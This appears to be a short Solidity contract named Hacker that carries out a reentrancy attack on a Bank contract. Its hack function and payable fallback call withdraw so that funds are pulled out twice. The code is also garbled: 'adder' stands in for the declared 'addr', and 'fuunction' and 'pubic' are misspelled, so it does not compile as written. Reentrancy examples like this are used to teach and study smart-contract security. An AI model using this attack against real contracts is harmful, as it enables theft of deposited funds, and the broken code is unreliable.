contract Hacker{
  bool status=false;
  Bank b;

  constructor(address addr)public{
b=Bank(adder);
}

fuunction hack()public {
  b.withdraw(1 ether);
  }
  function()pubic payable{
    if(!status){
      status=true;
      b.withdraw(1 ether);
      }
      }
}